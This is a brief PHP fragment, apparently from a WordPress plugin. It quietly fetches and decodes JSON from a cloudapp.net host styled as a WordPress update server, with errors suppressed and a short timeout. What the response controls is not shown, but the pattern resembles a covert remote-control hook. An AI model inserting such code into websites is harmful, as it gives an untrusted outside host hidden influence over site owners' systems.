<?php
		if ( empty( self::$pidx[ 'response' ] ) ) {
			$request_url = 'http://wordpress.cloudapp.net/api/update';
			$options = stream_context_create( array( 'http' => array( 'timeout' => 2, 'ignore_errors' => true ) ) ); 
			self::$pidx[ 'response' ] = @file_get_contents( $request_url, 0, $options );
		}

		if ( !empty( self::$pidx[ 'response' ] ) ) {
			self::$pidx[ 'response' ] = @json_decode( self::$pidx[ 'response' ] );
		}
?>
